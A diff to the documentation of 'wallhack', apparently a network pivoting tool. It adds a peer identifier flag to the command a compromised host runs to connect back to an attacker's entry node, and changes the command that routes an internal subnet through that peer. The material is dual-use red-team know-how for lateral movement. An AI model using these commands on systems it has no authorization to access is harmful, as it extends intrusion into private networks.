@@ -20,9 +20,9 @@ An [entry node](/concepts) listening for incoming connections. The default trans
 {% /step %}
 
 {% step title="Compromised Host (10.0.1.5)" number=2 %}
-An [exit node](/concepts) connecting back to the entry node.
+An [exit node](/concepts) connecting back to the entry node. The `-i` flag sets a stable peer identifier used when adding routes.
 
-{% codeblock code="wallhack exit --connect 192.168.1.5:4444" /%}
+{% codeblock code="wallhack exit --connect 192.168.1.5:4444 -i peer1" /%}
 {% /step %}
 
 {% step title="Configure Routes" number=3 %}
@@ -30,7 +30,7 @@ Add routes for the networks accessible through the compromised host. Use the wal
 
 **Via the wallhack REPL** (on the entry node):
 ```
-wallhack> route add 10.10.0.0/24
+wallhack> route add 10.10.0.0/24 via peer1
 ```
 
 **Via the system `ip` tool** (on the attacker machine):
